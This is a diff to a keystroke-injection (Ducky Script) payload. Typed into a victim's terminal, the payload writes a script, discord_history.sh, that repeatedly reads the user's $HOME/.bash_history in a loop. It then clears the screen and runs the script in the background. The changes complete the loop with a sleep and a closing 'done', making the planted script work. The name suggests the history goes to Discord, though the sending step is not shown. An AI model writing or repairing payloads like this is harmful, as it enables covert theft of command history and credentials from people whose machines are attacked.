@@ -27,7 +27,7 @@ DELAY 1400
 STRING printf %s 'history_file=' > discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$HOME/.bash_history' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh
 ENTER
 DELAY 1400
-STRING printf %s 'while true; do' >> discord_history.sh
+STRING printf %s 'while true; do' >> discord_history.sh; echo >> discord_history.sh
 ENTER
 DELAY 1400
 STRING printf %s '    if [ -f ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$history_file' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' ] && [ -s ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$history_file' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' ]; then' >> discord_history.sh; echo >> discord_history.sh
@@ -54,7 +54,7 @@ DELAY 1400
 STRING printf %s '        ' >> discord_history.sh; printf %s done >> discord_history.sh; printf %s ' < ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$history_file' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh
 ENTER
 DELAY 1400
-STRING printf %s '    fi' >> discord_history.sh; clear
+STRING printf %s '    fi' >> discord_history.sh; echo >> discord_history.sh; printf %s '    sleep 5' >> discord_history.sh; echo >> discord_history.sh; printf %s 'done' >> discord_history.sh; clear
 ENTER
 DELAY 1400
 STRING bash ./discord_history.sh &
